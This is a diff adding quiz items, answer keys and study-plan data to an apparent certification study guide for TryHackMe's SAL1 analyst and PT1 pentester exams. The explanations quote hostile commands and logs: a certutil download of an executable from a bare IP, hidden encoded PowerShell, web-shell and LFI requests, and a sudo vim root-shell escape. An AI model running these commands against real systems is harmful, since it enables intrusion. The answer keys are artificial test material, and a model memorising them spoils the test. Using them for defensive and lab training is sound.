+        ["A CVE for a PowerShell vulnerability","CVEs look like CVE-2024-12345. ATT&CK IDs describe behavior, not bugs."],
+        ["A Windows event ID for script logging","PowerShell script block logging is event 4104. T1059.001 is an ATT&CK ID."],
+        ["A tactic, the attacker's goal","Tactics have TA IDs, like TA0002 for Execution. T IDs are techniques."]],a:0},
+    {d:"3.0",q:"A reported email shows From: Payroll <payroll@acme.example> and Authentication-Results: spf=fail; dkim=none; dmarc=fail. The Reply-To is acme-payroll@freemail.example. What is the BEST conclusion?",
+     o:[["The sender is spoofed: acme.example's servers didn't send it, and replies go to the attacker","Right. SPF and DMARC failing means the message didn't come from a server allowed to send for acme.example. The outside Reply-To catches the victim's answer."],
+        ["It's real, because the From address is the company's own","The From field is easy to fake. The authentication results show it wasn't sent by acme.example."],
+        ["It's real but misconfigured; tell payroll to fix SPF","Possible in theory, but the outside Reply-To makes this a classic spoof."],
+        ["DKIM none proves it was sent internally","DKIM none only means there was no signature. It proves nothing about where it came from."]],a:0},
+    {d:"3.0",q:"Sysmon shows certutil.exe -urlcache -split -f http://198.51.100.9/u.exe C:\\Users\\Public\\u.exe on a finance laptop. What is this?",
+     o:[["A built-in Windows tool abused to download a file (living off the land)","Right. certutil is meant for certificates, but attackers use it as a downloader. LOLBAS lists it. Check the file's hash and what ran next."],
+        ["Windows Update fetching a patch","Windows Update doesn't use certutil, and it doesn't drop .exe files in C:\\Users\\Public."],
+        ["A certificate renewal","Renewals don't download executables from a bare IP address."],
+        ["Normal, because certutil is signed by Microsoft","Signed tools get abused because they're trusted. Who signed it doesn't tell you what it was used for."]],a:0},
+    {d:"3.0",q:"Proxy logs show WS-31 contacting cdn-upd8.example every 60 seconds, around the clock, sending about 300 bytes each time. The domain was registered 4 days ago. What is this MOST likely?",
+     o:[["Command and control beaconing","Right. Regular timing, tiny payloads, a brand-new domain and traffic at all hours all point to malware checking in with its server."],
+        ["Normal software update checks","Update checks don't usually run every minute, and they go to vendor domains that are years old."],
+        ["Data exfiltration in progress","300 bytes a minute is too little to be moving data out. It looks like check-ins."],
+        ["A user browsing a news site","People don't browse at exact 60-second intervals all night."]],a:0},
+    {d:"4.0",q:"You've confirmed ransomware is starting to encrypt files on FIN-LT07. Which tool lets you cut that laptop off from the network fastest, while keeping it running for investigation?",
+     o:[["EDR, using its host isolation feature","Right. EDR can isolate a host in one click: it blocks network traffic except to the EDR console, so the laptop stays on for evidence."],
+        ["The SIEM","The SIEM collects and searches logs. It can't contain a host on its own."],
+        ["A vulnerability scanner","Scanners find weaknesses. They don't respond to incidents."],
+        ["Threat intelligence platform","Threat intel tells you about indicators. It can't isolate anything."]],a:0},
+    {d:"4.0",q:"In Splunk, which search counts failed Windows logons by source IP, highest first?",
+     o:[["index=wineventlog EventCode=4625 | stats count by src_ip | sort -count","Right. 4625 is a failed logon, stats count by src_ip groups them, and sort -count puts the noisiest source first."],
+        ["index=wineventlog EventCode=4624 | stats count by src_ip | sort -count","4624 is a successful logon, not a failed one."],
+        ["index=wineventlog EventCode=4625 | table src_ip | sort count","table lists rows without counting them, and sort count sorts lowest first."],
+        ["index=wineventlog EventCode=4625 | dedup src_ip","dedup keeps one row per IP. It throws away the count you need."]],a:0},
+    {d:"5.0",q:"You've confirmed a true positive: mimikatz ran on a file server, and the playbook says credential theft goes to L2. What is your BEST next step as L1?",
+     o:[["Escalate to L2 now with the evidence: host, user, time, command line, hash and your findings","Right. L1 confirms and hands off quickly with everything L2 needs, so nobody has to redo your work."],
+        ["Reimage the server yourself to stop the attack","That destroys evidence and isn't L1's call. Follow the playbook."],
+        ["Close it, since the antivirus already quarantined the file","Mimikatz running means credentials may already be stolen. Quarantine doesn't undo that."],
+        ["Wait to see if the attacker does anything else","Waiting gives the attacker time to use the stolen credentials."]],a:0},
+    {d:"5.0",q:"Your SOC lead says alerts sit in the queue for an average of 42 minutes before an analyst picks them up. Which metric is that?",
+     o:[["Mean time to acknowledge (MTTA)","Right. MTTA measures from the alert firing to an analyst taking it."],
+        ["Mean time to detect (MTTD)","MTTD is from when the attack starts to when the alert fires."],
+        ["Mean time to respond (MTTR)","MTTR runs from the alert to containment, which takes longer than just picking it up."],
+        ["False positive rate","That's the share of alerts that weren't real, not a time."]],a:0}
+  ],
+  pbqs:[
+    {id:"queue",kind:"table",short:"Work the queue",title:"Triage the alert queue",dom:"5.0 · 3.0",
+     scenario:"You're the L1 analyst on shift. For each alert, pick the verdict and the right next step. Steps can repeat.",
+     cols:["Verdict","Next step"],
+     opts:[["True positive","False positive"],["Escalate to L2","Close with notes","Tune the rule"]],
+     rows:[
+       {req:"WINWORD.EXE on HR-PC07 started powershell.exe -nop -w hidden -enc ..., which then connected to a domain registered yesterday.",a:[0,0],why:"Word starting hidden, encoded PowerShell that calls a brand-new domain is a classic malicious macro. It's real and needs response, so escalate with the evidence."},
+       {req:"Impossible travel: jlee logged in from Virginia, then from Frankfurt 5 minutes later. The Frankfurt IP is the company's own VPN exit, and jlee was on VPN.",a:[1,1],why:"The 'travel' is the VPN. Document why it's benign and close it."},
+       {req:"Possible data exfiltration: 40 GB from BACKUP-01 to the backup vendor's known IP at 01:00. It has fired at 01:00 every night for six months.",a:[1,2],why:"It's the approved backup, and it fires every night. Close it and ask for a tuning change that excludes this known flow, so the queue stops filling with it."},
+       {req:"certutil.exe on FIN-LT03 downloaded payload.exe to C:\\Users\\Public. Its hash is flagged by 12 antivirus engines.",a:[0,0],why:"A built-in tool abused to download a known-bad file. Escalate so the host is contained and the payload is investigated."},
+       {req:"A user reported a phishing email with a credential page. Mail logs show nobody clicked, and the email gateway already pulled the message from every inbox.",a:[0,1],why:"The phishing was real (true positive), but it's contained and nobody clicked. Record the IOCs and close it. Nothing is left for L2."}]},
+    {id:"logs",kind:"match",short:"Read the logs",title:"Name what the log shows",dom:"3.0 · 4.0",
+     scenario:"Each snippet comes from your SIEM. Pick what it shows. Each answer is used once; two choices are distractors.",
+     pick:"What it shows",choices:["Brute force, then success","Encoded PowerShell","Web shell","DNS tunneling","Scheduled task persistence","Data exfiltration","Kerberoasting","SQL injection"],
+     items:[
+       {src:"Windows Security log · DC-01",log:"38 x EventCode=4625  user=jsmith  src=185.220.101.4  (02:11:05 to 02:12:40)\n1 x  EventCode=4624  user=jsmith  src=185.220.101.4  LogonType=10",a:0,why:"Dozens of failures for one account from one outside IP, then a successful RDP logon (type 10). The guessing worked: escalate and reset the account."},
+       {src:"Sysmon EventID 1 · HR-PC07",log:"ParentImage: C:\\Program Files\\Microsoft Office\\WINWORD.EXE\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...",a:1,why:"Word starting hidden PowerShell with an encoded command is the classic macro attack. Decode the Base64 to see what it does."},
+       {src:"Web access log · web-02",log:"10.0.0.1 - - \"POST /uploads/img_442.php?cmd=whoami HTTP/1.1\" 200 31\n10.0.0.1 - - \"POST /uploads/img_442.php?cmd=net+user HTTP/1.1\" 200 812",a:2,why:"A .php file in the uploads folder taking commands in a cmd parameter is a web shell. Someone uploaded code and is now running commands on the server."},
+       {src:"DNS log · resolver",log:"WS-18 TXT? aGVsbG8gd29ybGQ.x7k.example\nWS-18 TXT? dGhpcyBpcyBkYXRh.x7k.example\nWS-18 TXT? c2VjcmV0cyBoZXJl.x7k.example  (900 queries in 10 min)",a:3,why:"Hundreds of TXT lookups with long, random-looking subdomains of one domain means data is being carried inside DNS queries."},
+       {src:"Windows Security log · FIN-LT03",log:"EventCode=4698  A scheduled task was created\nTask Name: \\Microsoft\\Windows\\Update\\Updater\nAction: C:\\Users\\Public\\svc.exe   Trigger: At logon",a:4,why:"A task disguised as an update that runs a file from C:\\Users\\Public at every logon. That's persistence."},
+       {src:"Firewall · edge",log:"src=10.0.4.22 dst=198.51.100.7:443 bytes_out=2.1 GB time=02:13\n(30-day average for 10.0.4.22: under 50 MB a day)",a:5,why:"A huge outbound transfer at 2 AM from a host that normally sends almost nothing points to data leaving the network."}]}
+  ],
+  before:[["Security+","The foundation most SOC jobs ask for"],["CC","Optional first cert if security is new to you"],["Network+","Reading traffic is half the job"]],
+  hereNote:"The hands-on SOC step on the Cyber path",
+  mapSub:"SAL1 turns Security+ knowledge into hands-on analyst skills, and sets you up for CySA+. Tap any cert to jump to it.",
+  keep:[
+    {lab:"Renewal",big:"3 years",text:"TryHackMe certs are valid for 3 years from the day you start the exam. Today you renew by passing the exam again.",after:"TryHackMe says renewal through a more advanced cert or related rooms is coming."},
+    {lab:"DoD 8140",big:"Not listed",text:"SAL1 isn't on the DoD 8140 qualification matrix (V2.1), and it was never on the old 8570 list. On its own it won't qualify you for a coded billet.",after:"Pair it with Security+ or CySA+, which are on the matrix, for analyst work roles like Cyber Defense Analyst (511)."},
+    {lab:"Use it",big:"Show the work",text:"It proves you can triage a queue, which is exactly what Tier 1 interviews test. Add the badge to your résumé and LinkedIn with the verify link.",after:"In a Coast Guard SOC or a contractor interview, walk through one simulator case: alert, evidence, verdict, escalation."}],
+  sources:[
+    ["TryHackMe: SAL1 certification","https://tryhackme.com/certification/security-analyst-level-1"],
+    ["TryHackMe Help: SAL1 training content","https://help.tryhackme.com/en/articles/10625003-sal1-training-content"],
+    ["TryHackMe Help: exam format and timings","https://help.tryhackme.com/en/articles/10625024-exam-format-and-timings"],
+    ["TryHackMe Help: exam scoring","https://help.tryhackme.com/en/articles/10625043-exam-scoring"],
+    ["TryHackMe Help: certification access and retakes","https://help.tryhackme.com/en/articles/10624994-certification-access"],
+    ["TryHackMe Help: renewals","https://help.tryhackme.com/en/articles/10625059-renewals"],
+    ["TryHackMe Help: exam preparation advice","https://help.tryhackme.com/en/articles/10625102-general-exam-preparation-advice"],
+    ["DoD 8140 qualification matrix V2.1 (DoD Cyber Exchange)","https://dl.dod.cyber.mil/wp-content/uploads/8140/pdf/(U)%202025-09-19_DoD8140MatrixV2.1_DoPSR.pdf"]]
+};
+
+GUIDES["PT1 · Junior Pentester"]={
+  id:"pt1",
+  title:"PT1",
+  lead:"TryHackMe's Junior Penetration Tester cert. There's no multiple choice: you get 48 hours to attack a web app, a network and an Active Directory domain in a legal lab, capture flags, then write the professional report a client would read. It proves you can run a small pentest from start to finish.",
+  checked:"Nov 10, 2026",
+  planHours:100,
+  objSub:"Six topic areas from TryHackMe's PT1 training content. Tick objectives as you study them; progress saves on this device.",
+  planSub:"Set how many hours a week you can give it. The plan splits about 100 hours across the six areas, then saves the last stretch for full practice runs with a written report.",
+  pbqSub:"Hands-on practice in the style of the exam: read real tool output, then make the call a pentester would.",
+  versions:{
+    cur:{code:"PT1",label:"Current exam",status:"Launched 2025 · 48-hour practical",
+      note:"Three engagements, web application, network and Active Directory, each with its own scope and rules of engagement. You submit flags and write a report for each one. Candidates report a pass mark of 750 of 1000, with web worth the most.",
+      numbered:false,onote:"TryHackMe lists these six areas without weights. The bars are a suggested study share, based on candidates reporting web at about 40% of the score, network about 36% and Active Directory about 24%.",
+      domains:[
+        {n:"1.0",name:"Reconnaissance and Enumeration",w:15,obj:[
+          ["WHOIS, DNS and subdomain discovery","Map the target's names and addresses before you touch anything else."],
+          ["Nmap and port scanning strategies","Fast full-port sweeps first, then version and script scans on what's open."],
+          ["Banner grabbing and service fingerprinting","Pin down exact software versions so you can look up known flaws."],
+          ["Web and network account and service enumeration","Usernames, shares, directories, virtual hosts and API endpoints."],
+          ["Exposed services and misconfigurations","Anonymous logins, default passwords, open shares and debug pages."]]},
+        {n:"2.0",name:"Web Application Testing",w:30,obj:[
+          ["OWASP Top 10 vulnerabilities","SQL injection, XSS, IDOR, SSRF and the rest, found and exploited by hand."],
+          ["Manual testing techniques","Change one thing at a time and watch how the app responds."],
+          ["Burp Suite","Proxy, Repeater, Intruder and Decoder: intercept, replay, fuzz and decode requests."],
+          ["Authentication and session flaws","Weak logins, predictable tokens, missing logout and session fixation."],
+          ["File upload and path traversal","Getting code onto the server, and reading files you shouldn't."],
+          ["Bypassing client-side controls","Anything the browser enforces, the attacker can skip. Test the server."]]},
+        {n:"3.0",name:"Network Penetration Testing",w:20,obj:[
+          ["SMB, RDP, FTP, SSH and SNMP","Find and exploit weak or misconfigured services on these ports."],
+          ["Password attacks","Brute force and password spraying, and staying under the lockout limit."],
+          ["Misconfigured and outdated services","Match versions to public exploits, and test default settings."],
+          ["Pivoting and lateral movement","Use one compromised host to reach networks you couldn't before."],
+          ["Sniffing, traffic analysis and man-in-the-middle","What you can capture on a network, and what it gives away."],
+          ["Firewalls and network segmentation","Work out what's filtered, and find the paths that aren't."]]},
+        {n:"4.0",name:"Active Directory Exploitation",w:15,obj:[
+          ["Kerberos attacks","AS-REP roasting and Kerberoasting, then cracking the hashes offline."],
+          ["LDAP and domain enumeration","Users, groups, computers and policies, with or without credentials."],
+          ["Misconfigured permissions and trusts","Rights like GenericAll or WriteDACL that hand you control of other objects."],
+          ["Pass-the-hash and pass-the-ticket","Log in with a stolen hash or Kerberos ticket instead of a password."],
+          ["Privilege escalation in a Windows domain","From a normal user to domain admin, one step at a time."],
+          ["BloodHound","Graph the domain and find the shortest path to the account you want."]]},
+        {n:"5.0",name:"Exploitation and Post-Exploitation",w:12,obj:[
+          ["Metasploit and manual exploitation","Use frameworks when they fit, and know how to do it by hand when they don't."],
+          ["Reverse and bind shells","Which one gets through the firewall, and how to make a shell stable."],
+          ["File transfer","Moving tools and loot with HTTP servers, SMB shares, certutil, wget and scp."],
+          ["Persistence and staging","How attackers keep access, and why you document anything you add."],
+          ["Privilege escalation on Linux and Windows","Sudo rights, SUID files, weak services and stored credentials."],
+          ["Operational security","Stay inside the rules of engagement and leave the lab as you found it."]]},
+        {n:"6.0",name:"Reporting and Time Management",w:8,obj:[
+          ["Clear vulnerability reports","What it is, where it is, how you proved it and what it lets an attacker do."],
+          ["Prioritizing findings by risk","Rank by impact and how easy it is to exploit, not by how fun it was."],
+          ["Relevant mitigations","A specific fix for the root cause, not 'apply best practices'."],
+          ["Managing a 48-hour window","Plan sleep, set time limits per target and move on when you're stuck."],
+          ["Note-taking during a test","Commands, output and screenshots as you go, so the report writes itself."],
+          ["Communicating attack paths and impact","Tell the story from first foothold to the flag, in order."]]}
+      ]}
+  },
+  extras:[
+    {kind:"steps",title:"Your 48 hours",sub:"All areas · one engagement at a time",rows:[
+      "Read the scope and rules of engagement for the section. Note what's off-limits.",
+      "Recon: full port scan, then versions and scripts on open ports.",
+      "Enumerate every service: web paths, shares, users, versions.",
+      "Exploit the most promising path. Time-box each idea to about an hour.",
+      "Escalate privileges and grab the flags. Screenshot every step.",
+      "Write that section's findings while it's fresh, then move on.",
+      "Last block: proofread the report. It's graded, not just the flags."]},
+    {kind:"ports",title:"Ports to check first",sub:"1.0 · 3.0 · 4.0",rows:[
+      ["21","FTP","Anonymous login, readable or writable files"],
+      ["22","SSH","Reused or weak passwords, keys you've found"],
+      ["53","DNS","Zone transfers, internal names"],
+      ["80/443","HTTP/S","The web app: most of the points"],
+      ["88","Kerberos","A domain controller. AS-REP roast and Kerberoast"],
+      ["139/445","SMB","Null sessions, open shares, signing off"],
+      ["161 UDP","SNMP","Community strings like public leak users and processes"],
+      ["389","LDAP","Domain users, groups and descriptions"],
+      ["3389","RDP","Logins with sprayed or found credentials"],
+      ["5985","WinRM","Remote PowerShell with Evil-WinRM"]]},
+    {kind:"rows",wide:true,title:"AD attacks at a glance",sub:"4.0 · what each one needs",rows:[
+      ["AS-REP roast","No credentials needed","Accounts with Kerberos pre-authentication turned off hand out a crackable hash (hashcat mode 18200)."],
+      ["Kerberoast","Any domain user","Request tickets for accounts with an SPN and crack them offline (hashcat mode 13100)."],
+      ["Spray","A user list","One or two common passwords across every user, staying under the lockout limit."],
+      ["Pass-the-hash","An NT hash","Log in with the hash itself. No cracking needed."],
+      ["BloodHound","Any domain user","Collect the domain's relationships and find the shortest path to Domain Admins."]]},
+    {kind:"rows",title:"Anatomy of a finding",sub:"6.0 · every write-up has these",rows:[
+      ["Title","What and where","SQL injection in /login"],
+      ["Severity","How bad","Impact and likelihood, usually CVSS"],
+      ["Impact","So what","What an attacker can do with it"],
+      ["Steps","Reproduce it","Exact requests and commands, in order"],
+      ["Evidence","Prove it","Screenshots and tool output"],
+      ["Fix","Remediation","A specific fix for the root cause"]]}
+  ],
+  facts:[["Time","48","hours"],["Format","Practical","+ report"],["Passing","750","of 1000"],["Sections","3","web · net · AD"],["Study","80–120","hours"],["Voucher","$349","US price"],["Valid","3","years"],["Retake","1","free"]],
+  method:[
+    ["Map","Use the six areas above as your checklist. Web app testing is worth the most, so give it the most time."],
+    ["Learn","Work through TryHackMe's Jr Penetration Tester path, plus the Active Directory rooms it points to."],
+    ["Do","Hack legal labs only: TryHackMe, Hack The Box and your own virtual machines. Write a mini report for every box."],
+    ["Recall","Flashcards for ports, Nmap flags, Burp tools, hashcat modes and the AD attacks above."],
+    ["Test","Do a timed 48-hour practice run on a few unseen boxes, report included, before you book."]],
+  tips:[
+    ["Sleep is part of the plan","48 hours isn't a 48-hour sprint. Plan two real sleeps and you'll find more."],
+    ["Time-box rabbit holes","If an idea goes nowhere after an hour, write it down and try another path."],
+    ["Report as you go","Screenshot each step and write the finding right away. Rebuilding notes at hour 46 is how people fail."],
+    ["Follow their format","Reports are graded against a structure, so match TryHackMe's recommended layout for each finding."],
+    ["Stay in scope","Every section has its own rules of engagement. Read them before you scan anything."]],
+  resources:[
+    {group:"Official",items:[
+      ["PT1 certification page","TryHackMe","https://tryhackme.com/certification/junior-penetration-tester","Paid","Price, the 48-hour window, the free retake and how to book."],
+      ["PT1 training content","TryHackMe Help Center","https://help.tryhackme.com/en/articles/11172303-pt1-training-content","Free","The six topic areas the exam covers. The checklist above comes from here."],
+      ["Certification access and retakes","TryHackMe Help Center","https://help.tryhackme.com/en/articles/10624994-certification-access","Free","Two attempts per purchase, valid for 12 months."]]},
+    {group:"Legal hacking labs",items:[
+      ["Jr Penetration Tester path","TryHackMe","https://tryhackme.com/path/outline/jrpenetrationtester","Free tier","The path built for PT1, from recon to privilege escalation."],
+      ["Web Security Academy","PortSwigger","https://portswigger.net/web-security","Free","The best free web labs: SQL injection, XSS, SSRF, access control and more."],
+      ["HTB Academy","Hack The Box","https://academy.hackthebox.com","Free tier","Modules on every phase, with legal target machines."],
+      ["OWASP Juice Shop","OWASP","https://owasp.org/www-project-juice-shop/","Free","A deliberately broken web app you run on your own machine."]]},
+    {group:"Reference",items:[
+      ["GTFOBins","GTFOBins","https://gtfobins.github.io","Free","How normal Linux programs get abused for privilege escalation."],
+      ["HackTricks","HackTricks","https://book.hacktricks.wiki","Free","A checklist for almost every service and attack you'll meet."],
+      ["OWASP Top 10","OWASP","https://owasp.org/www-project-top-ten/","Free","The most common web app risks, with fixes."]]}
+  ],
+  quiz:[
+    {d:"1.0",q:"A default Nmap scan of 10.10.5.20 shows only 22 and 80 open. The scope summary says the host also runs an admin service. What should you do next?",
+     o:[["Scan all 65,535 TCP ports, for example nmap -p- --min-rate 1000, then run -sV -sC on anything new","Right. Without -p, Nmap only checks the 1,000 most common ports. Admin services often sit on high ports like 8443 or 10000."],
+        ["Run a UDP scan of the top 100 ports","UDP is worth a look later, but an admin web service is almost always TCP. Check all TCP ports first."],
+        ["Start brute-forcing SSH on 22","You haven't finished enumerating. Brute force is slow, noisy and usually the last resort."],
+        ["Run nmap -sn to confirm the host is up","-sn is a ping sweep with no port scan, and you already know the host is up."]],a:0},
+    {d:"1.0",q:"robots.txt on the target contains Disallow: /dev-backup/. What does that mean for your test?",
+     o:[["It's a lead worth checking. robots.txt only asks search engines to stay away; it doesn't block anyone","Right. robots.txt is a polite request to crawlers, not access control. Disallowed paths often point at the interesting parts of a site."],
+        ["The folder is protected and out of reach","Nothing in robots.txt protects a folder. Browse to it and see."],
+        ["It's out of scope because the owner disallowed it","Scope comes from your rules of engagement, not from robots.txt."],
+        ["It means the site has no other hidden folders","It lists only what the owner chose to list. Keep running content discovery."]],a:0},
+    {d:"2.0",q:"Logged in as bob, GET /api/invoices/1043 shows your invoice. Changing it to 1042 returns another customer's invoice. What is it, and what's the fix?",
+     o:[["IDOR (broken access control). The server must check that the invoice belongs to the logged-in user","Right. The app trusts the ID you send. The fix is a server-side ownership check on every request; random IDs alone only hide the problem."],
+        ["SQL injection. Use parameterized queries","Nothing here changes a database query. You asked for a valid ID that just isn't yours."],
+        ["Cross-site request forgery. Add CSRF tokens","CSRF tricks a victim's browser into sending a request. Here you read someone else's data directly."],
+        ["Session fixation. Rotate session IDs at login","Your session is fine. The app never checks who owns the invoice."]],a:0},
+    {d:"2.0",q:"An upload form only accepts images. You upload shell.php, change the Content-Type in Burp to image/png, and it's saved to /uploads/shell.php, where it runs. What's the root cause?",
+     o:[["The server trusts the Content-Type header the client sends instead of checking the file itself and where it's stored","Right. Content-Type is set by the client, so you control it. The fix: check the real file type and extension on the server, rename files, and store uploads where they can't run."],
+        ["The browser's file picker allowed .php files","Client-side checks don't matter. You can send any request with Burp."],
+        ["The file was too large","Size has nothing to do with whether code runs."],
+        ["The upload used HTTP instead of HTTPS","HTTPS protects the connection, not what the server does with the file."]],a:0},
+    {d:"2.0",q:"A 'fetch URL preview' feature lets you submit any address. Submitting http://127.0.0.1:8080/admin returns the internal admin page. Which vulnerability is this?",
+     o:[["Server-side request forgery (SSRF)","Right. You made the server send a request on your behalf to a place you can't reach yourself."],
+        ["Cross-site scripting (XSS)","XSS runs your script in another user's browser. Here the server made the request."],
+        ["Cross-site request forgery (CSRF)","CSRF makes a victim's browser send a request. Here it's the server doing it."],
+        ["Directory traversal","Traversal reads files through a path. You're reaching an internal web service through a URL."]],a:0},
+    {d:"3.0",q:"UDP port 161 is open on a printer, and the community string public works. Which tool gives you the most from it?",
+     o:[["snmpwalk (or snmp-check) with community public, to dump users, processes and network info","Right. SNMP with a default community string will often hand over running processes, user names, routes and installed software."],
+        ["smbclient -L","That lists SMB shares on 139/445, not SNMP."],
+        ["hydra against SSH","There's no SSH here, and brute force isn't needed when SNMP is open."],
+        ["Gobuster","Gobuster brute-forces web paths and DNS names. It doesn't speak SNMP."]],a:0},
+    {d:"3.0",q:"The rules of engagement say accounts lock after 5 failed logins in 30 minutes. You have 300 usernames. Which password attack fits BEST?",
+     o:[["Password spraying: try one or two likely passwords against every user, spaced out to stay under the limit","Right. Spraying tries few passwords across many users, so no single account hits the lockout limit."],
+        ["Brute-force each user with rockyou.txt","That locks out every account after five guesses, which can break the client's business and violates the rules."],
+        ["Brute-force only the administrator account","Five guesses won't get far, and locking the admin out is worse."],
+        ["Credential stuffing with one leaked list per user","Still many guesses per account, so you'd hit the lockout."]],a:0},
+    {d:"4.0",q:"You have a list of domain usernames but no password. Which attack can still give you something crackable?",
+     o:[["AS-REP roasting accounts that don't require Kerberos pre-authentication","Right. For those accounts, the domain controller hands out data encrypted with the user's password without any login. Crack it offline with hashcat mode 18200."],
+        ["Kerberoasting","Kerberoasting needs a working domain account to request service tickets."],
+        ["Pass-the-hash","You don't have a hash yet."],
+        ["DCSync","DCSync needs replication rights, which only highly privileged accounts have."]],a:0},
+    {d:"4.0",q:"BloodHound shows your user is in HelpDesk, and HelpDesk has GenericAll over the IT-Admins group, whose members are local admins on the file server. What's the shortest path?",
+     o:[["Use GenericAll to add yourself to IT-Admins, then log in to the file server as a local admin","Right. GenericAll is full control over the group, including changing its members. Add yourself, then use the group's rights."],
+        ["Kerberoast the members of IT-Admins","That might work if they have SPNs and weak passwords, but you already have a direct path."],
+        ["Run DCSync from your workstation","Nothing in that path gives you replication rights."],
+        ["Reset the krbtgt password","You have no rights over krbtgt, and it's far outside what the path gives you."]],a:0},
+    {d:"5.0",q:"The target can make outbound connections, but its firewall blocks all inbound ports except 80. You can run one command on it. Which shell is MOST likely to work?",
+     o:[["A reverse shell: the target connects out to your listener","Right. Outbound traffic is allowed, so make the target call you. Port 443 or 80 on your end blends in."],
+        ["A bind shell on port 4444","The target would listen on 4444, and the firewall blocks inbound traffic to it."],
+        ["A bind shell on port 80","80 is already used by the web server, so you can't bind to it."],
+        ["RDP to the target","RDP needs inbound 3389, which is blocked."]],a:0},
+    {d:"5.0",q:"On a Linux foothold, sudo -l shows: (root) NOPASSWD: /usr/bin/vim. What's the fastest way to root?",
+     o:[["sudo vim -c ':!/bin/sh' to get a root shell from inside vim","Right. vim can run shell commands, and sudo runs vim as root, so the shell is root too. GTFOBins lists this."],
+        ["Edit /etc/shadow with vim to crack root's hash","You could edit files as root, but cracking a hash is slow. The shell escape is instant."],
+        ["Look for a kernel exploit","Kernel exploits can crash the box. Easy sudo rights come first."],
+        ["sudo su","Your rule only allows vim, so sudo su will ask for a password and fail."]],a:0},
+    {d:"6.0",q:"You found two issues: an unauthenticated SQL injection on the public login page that dumps all password hashes, and a missing security header on an internal page. How should they appear in the report?",
+     o:[["SQL injection first, rated critical, with steps, evidence and a specific fix; the header as low","Right. Rank by impact and how easy it is to exploit. Anyone on the internet can use the injection to steal every password hash."],
+        ["Both as high, so the client fixes everything","Inflating ratings makes the report less useful. Clients need to know what to fix first."],
+        ["In the order you found them","Order by risk, not by when you found them."],
+        ["Leave the header out, since it's minor","Report it, just rated low. Leaving findings out makes the report incomplete."]],a:0}
+  ],
+  pbqs:[
+    {id:"next",kind:"match",short:"Read the output",title:"Name the opening from the tool output",dom:"1.0 · 3.0 · 4.0",
+     scenario:"Each snippet comes from an authorized lab engagement. Pick the opening it shows. Each answer is used once; two choices are distractors.",
+     pick:"Opening",choices:["SNMP enumeration","Anonymous SMB share","IDOR","AS-REP roasting","Sudo abuse (GTFOBins)","Local file inclusion","Kerberoasting","Pass-the-hash"],
+     items:[
+       {src:"nmap -sU -p161 --script snmp-info 10.10.5.12",log:"161/udp open  snmp  SNMPv1 server; community: public\n| snmp-info:\n|   enterprise: net-snmp\n|_  engineIDFormat: unknown",a:0,why:"SNMP answers with the default community public. Walk it with snmpwalk to pull users, processes and network details."},
+       {src:"smbclient -L //10.10.5.20 -N",log:"Anonymous login successful\n\n  Sharename       Type      Comment\n  ---------       ----      -------\n  IT_Backup       Disk      Nightly configs\n  IPC$            IPC       Remote IPC",a:1,why:"-N means no password, and it still listed shares. Connect to IT_Backup and look for configs with credentials in them."},
+       {src:"Burp Repeater · logged in as bob",log:"GET /api/orders/5512 HTTP/1.1\nCookie: session=bob...\n\nHTTP/1.1 200 OK\n{\"order\":5512,\"owner\":\"alice\",\"card_last4\":\"4417\"}",a:2,why:"Bob's session reads Alice's order just by changing the number. The server never checks who owns the order."},
+       {src:"GetNPUsers.py corp.local/ -usersfile users.txt -no-pass",log:"[-] User jlee doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$svc_print@CORP.LOCAL:7f3a9c...e21b",a:3,why:"svc_print doesn't require pre-authentication, so you got its AS-REP without a password. Crack it with hashcat mode 18200."},
+       {src:"sudo -l (low-privilege shell)",log:"User www-data may run the following commands on web01:\n    (root) NOPASSWD: /usr/bin/vim",a:4,why:"vim can run shell commands, and sudo runs it as root. sudo vim -c ':!/bin/sh' gives a root shell."},
+       {src:"curl 'http://10.10.5.30/index.php?page=../../../../etc/passwd'",log:"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",a:5,why:"The page parameter is included from the file system, and ../ walks out of the web folder. Read config files next for credentials."}]},
+    {id:"rate",kind:"table",short:"Rate and fix",title:"Rate each finding and pick the fix",dom:"6.0",
+     scenario:"You're writing the report. For each finding, pick a severity and the fix that addresses the root cause. Each fix is used once.",
+     cols:["Severity","Fix"],
+     opts:[["Critical","High","Medium","Low"],["Parameterized queries","Server-side owner check","Require SMB signing","Hide version banners"]],
+     rows:[
+       {req:"Unauthenticated SQL injection on the internet-facing login page. It dumps every user's password hash.",a:[0,0],why:"Anyone on the internet can exploit it with no account, and it exposes every credential. That's critical. Parameterized queries fix the root cause."},
+       {req:"Logged-in customers can read other customers' orders, including names and addresses, by changing the order number.",a:[1,1],why:"It needs a login, but any customer can read everyone's data. That's high. The fix is checking ownership on the server for every request."},
+       {req:"SMB signing isn't required on internal file servers, so captured logins can be relayed by someone already inside the network.",a:[2,2],why:"Serious, but the attacker must already be inside the network, so it's usually medium. Require signing on every host."},
+       {req:"The public web server's banner shows Apache/2.4.58.",a:[3,3],why:"It only helps an attacker pick exploits. Low. Turn off version details in the server banner."}]}
+  ],
+  before:[["Security+","The security foundation pentesting builds on"],["SAL1","Knowing how defenders work makes your reports land","SAL1 · Security Analyst L1"],["Network+","Networks are a third of the exam"]],
+  next:[["PenTest+","CompTIA's pentest cert, which is on the DoD 8140 matrix"],["CySA+","Defensive depth, so you can explain what to detect"]],
+  hereNote:"Hands-on offensive practice before PenTest+",
+  mapSub:"PT1 is hands-on proof you can run a small pentest. Pair it with PenTest+, which DoD billets recognize. Tap any cert to jump to it.",
+  keep:[
+    {lab:"Renewal",big:"3 years",text:"TryHackMe certs are valid for 3 years from the day you start the exam. Today you renew by passing the exam again.",after:"TryHackMe says renewal through a more advanced cert or related rooms is coming."},
+    {lab:"DoD 8140",big:"Not listed",text:"PT1 isn't on the DoD 8140 qualification matrix (V2.1), and it was never on the old 8570 list. On its own it won't qualify you for a coded billet.",after:"PenTest+ is on the matrix, for roles like Vulnerability Assessment Analyst (541). PT1 is great practice before it."},
+    {lab:"Use it",big:"Show the work",text:"A practical exam with a graded report is strong proof for junior pentest interviews. Add the badge with its verify link.",after:"Bring a sanitized sample report from a practice lab to interviews. It shows you can explain what you found."},
